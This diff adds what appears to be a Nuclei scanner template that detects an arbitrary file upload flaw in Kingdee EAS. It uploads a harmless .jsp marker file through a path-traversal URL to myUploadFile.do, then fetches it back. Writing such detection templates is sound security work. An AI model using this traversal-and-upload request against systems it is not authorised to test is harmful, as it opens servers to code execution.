@@ -1,0 +1,52 @@
+id: kingdee-eas-myuploadfile-file-upload
+info:
+  name: Kingdee EAS myUploadFile Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alpha(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/easportal/buffalo/%2e%2e/cm/myUploadFile.do"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx"
+    body: |-
+      ------WebKitFormBoundarySq4lDnabv8CwHfvx
+      Content-Disposition: form-data; name="myFile"; filename="{{t1}}.jsp"
+      Content-Type: text/html
+
+      {{t2}}
+      ------WebKitFormBoundarySq4lDnabv8CwHfvx--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "context is null"
+
+  - id: file-access
+    method: GET
+    path:
+      - "{{BaseURL}}/easportal/buffalo/../{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+      - type: word
+        words:
+          - "<"
+        negative: true
